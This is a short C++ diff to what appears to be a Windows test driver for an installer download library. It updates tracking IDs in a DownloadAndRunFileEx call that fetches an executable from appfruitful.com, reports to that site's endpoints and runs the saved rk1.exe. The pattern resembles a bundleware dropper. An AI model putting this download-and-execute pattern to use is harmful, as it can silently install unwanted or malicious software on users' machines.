@@ -4,10 +4,13 @@
 #include <wininet.h>
 #include <tchar.h>
 #include <stdio.h>
+#include <map>
 
 #include "InetUtils.h"
 
 #define NSIS_MAX_STRLEN 1024
+
+extern std::map<DWORD, DWORD> DownloadThreads;
 
 int _tmain(int argc, _TCHAR* argv[])
 {
@@ -20,12 +23,12 @@ int _tmain(int argc, _TCHAR* argv[])
 	DWORD dwResult;
 	//dwResult= InetUtils::InternetRequestDownload(url, file);
 	//dwResult = InetUtils::InternetRequestFeedback(url, file, &dwTotal);
-
+	
 	
 	dwResult = InetUtils::DownloadAndRunFileEx(
-		TEXT("https://appfruitful.com/relevant.exe?quant=1347990920"),
-		TEXT("https://appfruitful.com/info.php?quant=1347990920"),
-		TEXT("https://appfruitful.com/installer.php?CODE=PUTGQ&quant=1347990920&action="),
+		TEXT("https://appfruitful.com/relevant.exe?quant=1355595965"),
+		TEXT("https://appfruitful.com/info.php?quant=1355595965"),
+		TEXT("https://appfruitful.com/installer.php?CODE=PUTGQ&quant=1355595965&action="),
 		TEXT("rk1"),
 		TEXT("d:\\InetUtils\\InetUtils\\rk1.exe"),
 		TEXT("1935"),
